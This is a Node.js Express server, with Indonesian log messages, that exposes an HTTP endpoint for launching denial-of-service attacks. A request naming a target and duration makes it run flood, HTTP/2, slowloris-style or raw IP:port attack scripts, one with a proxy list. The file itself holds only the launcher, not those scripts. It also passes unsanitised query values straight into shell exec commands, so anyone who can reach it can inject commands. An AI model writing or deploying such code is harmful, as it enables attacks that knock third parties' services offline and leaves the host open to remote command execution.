const express = require('express');
const { exec } = require('child_process');
const fetch = require('node-fetch');

const app = express();
const port = process.env.PORT || 5032;

async function fetchData() {
  try {
    const res = await fetch('https://httpbin.org/get');
    const data = await res.json();
    console.log(`\n[✔] Endpoint Siap: http://${data.origin}:${port}/syafrial\n`);
  } catch {
    console.log(`[!] Gagal ambil IP publik, endpoint tetap berjalan di port ${port}`);
  }
}

app.get('/syafrial', (req, res) => {
  const { target, time, methods } = req.query;

  if (!target || !time) {
    return res.status(400).json({ error: 'Missing target or time parameter' });
  }

  const ipPortPattern = /^\d{1,3}(\.\d{1,3}){3}:\d+$/;
  if (ipPortPattern.test(target)) {
    const [ip, port] = target.split(':');
    exec(`node ./lib/cache/raw.js ${ip} ${port} ${time}`);
    return res.json({ status: 'running raw (ip:port)', ip, port, time });
  }

  if (!methods || methods === 'flood') {
    exec(`node ./lib/cache/flood.js ${target} ${time} 32 16 proxy.txt`);
    return res.json({ status: 'running flood', target, time });
  }

  if (methods === 'http2') {
    exec(`node ./lib/cache/http2.js ${target} ${time}`);
    return res.json({ status: 'running http2', target, time });
  }

  if (methods === 'slow') {
    exec(`node ./lib/cache/slow.js ${target} ${time}`);
    return res.json({ status: 'running slow', target, time });
  }
  
  res.status(400).json({ error: 'Unsupported method or invalid target' });
});

app.listen(port, '0.0.0.0', () => {
  fetchData();
});